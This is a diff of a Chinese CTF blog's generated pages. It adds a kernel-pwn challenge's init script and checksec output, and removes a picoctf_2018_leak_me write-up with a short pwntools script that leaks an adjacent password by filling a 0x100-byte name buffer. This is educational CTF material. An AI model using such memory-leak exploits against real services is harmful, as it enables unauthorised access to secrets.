+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo "Welcome :)"</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接在home下加载的模块</span></span><br><span class="line">insmod /home/pwn/noob.ko</span><br><span class="line">chmod 666 /dev/noob</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
+
+<h5 id="LKMs-1"><a href="#LKMs-1" class="headerlink" title="LKMs"></a>LKMs</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/kernoob$ file noob.ko </span><br><span class="line">noob.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=7bc6535b4946f6dd01729e9b31c36e400efc8479, not stripped</span><br><span class="line">winter@ubuntu:~/kernoob$ checksec noob.ko </span><br><span class="line">[*] '/home/winter/kernoob/noob.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
+
+<p>64位程序，只开启了NX</p>
 
 	
 	</div>
@@ -1769,68 +1881,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/05/01/picoctf-2018-leak-me详解/" >picoctf_2018_leak_me详解</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-05-01  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
-</blockquote>
-<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
-<p>解决：</p>
-<ol>
-<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
-</li>
-<li><p>双击函数，然后f5</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
-</li>
-<li><p>然后就可以正常了</p>
-</li>
-</ol>
-<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
-<li>输入name</li>
-<li>打印name</li>
-<li>输入password</li>
-<li>比较输入password和password</li>
-<li>相同打印flag</li>
-</ol>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
-<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
-<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
-<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
-<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
-
-<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>
-
-	
-	</div>
-  <a type="button" href="/2021/05/01/picoctf-2018-leak-me详解/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1900,7 +1950,7 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
 		
-			<li><a href="/categories/复现/">复现<span>1</span></a></li>
+			<li><a href="/categories/复现/">复现<span>2</span></a></li>
 		
 			<li><a href="/categories/工具/">工具<span>1</span></a></li>
 		
@@ -1917,48 +1967,48 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
-		
-			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
-		
-			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
-		
-			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
-		
 			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
+		
+			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
 		
 			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
 		
-			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
-		
-			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
-		
-			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
-		
-			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
-		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
-		
-			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
-		
-			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
-		
 			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
-		
-			<li><a href="/tags/git/">git<span>1</span></a></li>
-		
-			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
 		
 			<li><a href="/tags/flair/">flair<span>1</span></a></li>
 		
+			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
+		
+			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
+		
+			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
+		
+			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
+		
+			<li><a href="/tags/unsortedbin-attack/">unsortedbin attack<span>1</span></a></li>
+		
+			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
+		
+			<li><a href="/tags/git/">git<span>1</span></a></li>
+		
 			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
 		
-			<li><a href="/tags/dasctf/">dasctf<span>1</span></a></li>
+			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
+		
+			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
+		
+			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>32</span></a></li>
+		   <li><a href="/tags">...<span>33</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1969,6 +2019,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/06/09/2021-ciscn-pwn初赛/" ><i class="fa fa-file-o"></i>2021_ciscn_pwn初赛</a>
+      </li>
     
       <li>
         <a href="/2021/06/06/os真象还原/" ><i class="fa fa-file-o"></i>os真象还原-笔记</a>
@@ -1984,10 +2038,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/05/13/pwn题模板/" ><i class="fa fa-file-o"></i>pwn wp模板</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/13/unsortedbin-attack/" ><i class="fa fa-file-o"></i>unsortedbin attack</a>
       </li>
     
   </ul>
